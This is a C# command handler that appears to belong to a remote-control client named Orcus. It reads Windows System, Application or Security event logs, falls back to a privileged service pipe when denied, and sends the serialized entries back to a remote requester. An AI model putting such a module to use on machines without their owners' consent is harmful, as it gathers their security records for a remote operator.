using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using Orcus.Plugins;
using Orcus.Service;
using Orcus.Shared.Commands.EventLog;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.EventLog
{
    internal class EventLogCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            System.Diagnostics.EventLog eventLog;
            int startPosition;

            switch ((EventLogCommunication) parameter[0])
            {
                case EventLogCommunication.RequestEventLog:
                    switch ((EventLogType) parameter[1])
                    {
                        case EventLogType.System:
                            eventLog = new System.Diagnostics.EventLog("System");
                            break;
                        case EventLogType.Application:
                            eventLog = new System.Diagnostics.EventLog("Application");
                            break;
                        case EventLogType.Security:
                            eventLog = new System.Diagnostics.EventLog("Security");
                            break;
                        default:
                            throw new ArgumentOutOfRangeException();
                    }
                    startPosition = BitConverter.ToInt32(parameter, 2);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }

            List<EventLogEntry> entries = null;

            try
            {
#pragma warning disable 618
                var lastItem = eventLog.Entries.Count - startPosition; //not -1 because the for condition is greater than
                var firstItem = eventLog.Entries.Count - startPosition - 301;
                if (firstItem < 0)
                    firstItem = 0;

                entries = new List<EventLogEntry>();
                for (int i = firstItem; i < lastItem; i++)
                {
                    var entry = eventLog.Entries[i];
                    entries.Add(new EventLogEntry
                    {
                        EntryType = (EventLogEntryType) entry.EntryType,
                        EventId = entry.EventID,
                        Source = entry.Source,
                        Timestamp = entry.TimeGenerated,
                        Message = entry.Message
                    });
                }
#pragma warning restore 618
            }
            catch (SecurityException)
            {
                if (ServiceConnection.Current.IsConnected)
                {
                    entries = ServiceConnection.Current.Pipe.GetSecurityEventLog(300);
                }

                if (entries == null)
                {
                    ResponseByte((byte) EventLogCommunication.ResponseNoAdministratorRights, connectionInfo);
                    return;
                }
            }

            var serializer = new Serializer(typeof (List<EventLogEntry>));
            var entriesData = serializer.Serialize(entries.OrderByDescending(x => x.Timestamp).ToList());
            var data = new byte[entriesData.Length + 5];
            data[0] = (byte) EventLogCommunication.ResponseEventLogEntries;
            Array.Copy(BitConverter.GetBytes(startPosition), 0, data, 1, 4);
            Array.Copy(entriesData, 0, data, 5, entriesData.Length);

            connectionInfo.CommandResponse(this, data);
        }

        protected override uint GetId()
        {
            return 6;
        }
    }
}